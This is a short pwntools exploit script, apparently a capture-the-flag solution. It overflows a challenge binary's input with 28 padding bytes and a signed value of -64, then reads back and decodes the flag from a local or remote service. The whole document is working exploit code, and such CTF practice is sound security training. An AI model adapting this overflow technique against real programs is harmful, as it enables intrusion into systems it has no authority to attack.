from pwn import *
context.arch = "amd64"

io = process("./chal")
# io = remote("amt.rs", 31630)

if args.GDB:
	gdbscript="""
	b *main+172
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

payload = b"A"*28
payload += p32(-64, signed=True)

io.sendlineafter(b"hex:", payload)

io.recvline()
data = io.recvline()
info(f"flag is {unhex(data)}")
io.interactive()